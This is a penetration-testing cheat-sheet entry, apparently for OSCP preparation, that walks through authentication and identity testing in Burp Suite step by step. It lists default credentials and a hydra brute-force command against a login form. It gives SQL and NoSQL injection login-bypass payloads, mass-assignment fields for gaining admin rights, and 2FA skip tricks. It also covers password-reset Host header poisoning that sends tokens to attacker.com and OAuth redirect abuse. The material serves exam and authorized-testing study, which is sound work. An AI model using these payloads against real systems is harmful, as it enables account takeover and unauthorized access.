title: Burp Auth — WSTG-ATHN/IDNT: Authentication & Identity Testing
body: WSTG-ATHN (10 tests) and WSTG-IDNT (5 tests). Most OSCP web footholds come from this category. Work the 7 techniques in order: default creds first (30 seconds, wins often), then registration mass assignment, login bypass, 2FA bypass, password reset abuse, brute force, username enumeration, and finally OAuth/SSO. The Boolean box (confirmed:false mass assignment) is the canonical IDNT example — the response JSON hands you the field, the request syntax hands you the notation, you combine them.
cmd:
# ══ ⭐ AUTH TESTING ORDER — work top to bottom ═══════════════════════

# 0) DEFAULT CREDENTIALS — 30 seconds, wins constantly (WSTG-ATHN-02)
admin:admin   admin:password   admin:admin123   admin:<appname>
root:root     root:toor        test:test        guest:guest
# App-specific: tomcat:tomcat  tomcat:s3cret  jenkins:jenkins  pi:raspberry
# Run with hydra if there's a login form:
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "http://$ip/login:username=^USER^&password=^PASS^:Invalid credentials" -t 4

# 1) REGISTRATION FLOW — mass assignment (WSTG-IDNT-04)
# Register a user. Intercept the PATCH/PUT/POST on settings/email/profile.
# READ THE RESPONSE JSON — every field is a candidate:
#   "confirmed":false  "admin":false  "role":"user"  "verified":false  "active":false
# READ THE REQUEST — find the naming convention:
#   user[email]=x  -> model=user, syntax=user[field] (Rails/Laravel bracket notation)
#   {"email":"x"}  -> JSON body, add "confirmed":true to the JSON object
# EXPLOIT: add the field from the response back to the request body:
#   Form body: add &user[confirmed]=true
#   JSON body: add "confirmed":true to the JSON object
# Framework recognition:
#   authenticity_token in body  = Rails   -> user[field] syntax
#   _token in body              = Laravel -> user[field] syntax
#   No CSRF token, flat body    = Spring/Express -> field=value
# Common mass-assignable fields to try:
user[confirmed]=true    user[admin]=true    user[role]=admin
user[verified]=true     user[active]=true   user[is_admin]=1
user[approved]=true     user[email_verified]=true

# 2) LOGIN BYPASS (WSTG-ATHN-04)
# SQL injection in the username field (see sqli_test for full payloads):
admin'--
admin' OR '1'='1'--
' OR 1=1-- -
# NoSQL injection (MongoDB):
username[$ne]=nonexistent&password[$ne]=nonexistent    # both not-equal = find anything
{"username":{"$gt":""},"password":{"$gt":""}}          # JSON body variant
# PHP type juggling (loose comparison ==):
password[]=                       # array vs string comparison bypasses == check
# Response manipulation in Repeater:
# Intercept the login response -> change "success":false to "success":true
# Or change HTTP 302 to 200, remove the Location: header -> stay on page
# Or change "login":false to "login":true in JSON response

# 3) 2FA / MFA BYPASS (WSTG-ATHN-10)
# After entering correct password: intercept the 2FA page request
# Try: browse directly to /dashboard without completing 2FA (step skip)
# Try: submit an empty/null OTP code
# Try: reuse a previously valid OTP (single-use? or time-window only?)
# Try: brute the 6-digit OTP (if no lockout): 000000-999999 via Intruder
# Try: remove the 2FA cookie check header and replay the post-login request

# 4) PASSWORD RESET ABUSE (WSTG-ATHN-09)
# Predictable reset token:
# Request a reset for your own account -> examine the token format
#   Sequential numeric (token=1001)       -> try 1000, 1002 -> others' resets
#   Short/low-entropy                     -> Intruder Brute forcer payload
#   Timestamp-based                       -> Sequencer or predict the time
# Host header injection:
# In Burp, modify the Host header of the reset request:
#   Host: attacker.com                    -> reset link mails to YOUR domain
#   X-Forwarded-Host: attacker.com        -> some apps use this for link building
# Token in response body:
# Sometimes the reset token appears IN the API response JSON (huge oversight)
# Check the response to /api/auth/forgot-password before checking email
# Password reset poisoning: if the link uses the Host header, attacker receives
# the token -> follows the link -> takes over the account

# 5) BRUTE FORCE / CREDENTIAL STUFFING (WSTG-ATHN-03)
# Check lockout policy FIRST: submit 5-10 bad passwords -> is the account locked?
# If no lockout -> Intruder Cluster Bomb (user list + password list)
# Intruder -> Cluster Bomb -> position §username§ and §password§
# Payload set 1: usernames from enumeration, set 2: rockyou / common passwords
# Grep Match: "Welcome" or "dashboard" or "Logged in" = success
# Or sort results by Response Length -> outlier = success
# Community rate-limited -> use Turbo Intruder for speed:
# Send to Turbo Intruder -> password_spray template -> configure concurrency

# 6) USERNAME ENUMERATION (WSTG-IDNT-04)
# Does "Username not found" differ from "Invalid password"?
# In Repeater: send request with valid username vs invalid -> compare:
#   Different status codes (200 vs 400)     -> enumerate
#   Different response body length          -> enumerate
#   Different error message text             -> enumerate
#   Different response TIME (timing oracle) -> enumerate (even if text is same)
# Intruder Sniper: position on username field, Simple list payload
# Sort by Response Length -> users that exist have different-length responses

# 7) OAUTH / SSO TESTING (WSTG-ATHZ-05)
# Check state parameter: is it validated? Remove/change it -> CSRF in OAuth
# Open redirect: does redirect_uri validate the domain? Try redirect_uri=attacker.com
# Auth code reuse: can an authorization code be used twice?
# Implicit flow: access token in URL fragment -> referrer leak risk
# In Burp: intercept the OAuth callback -> examine state, code, token
# Change the state to a different value -> does the server reject it?
warn: Default credentials win more often than any other technique — always try them first, 30 seconds, before any sophisticated bypass. Mass assignment requires reading BOTH the request (naming convention) and the response (field names) — miss either and you won't see it. Password reset Host header injection is trivially missed because it requires modifying a header, not a body parameter. 2FA skip is often a simple GET /dashboard before completing the OTP step — try it immediately after the password step.

choices.label: Got in — test session management / JWT
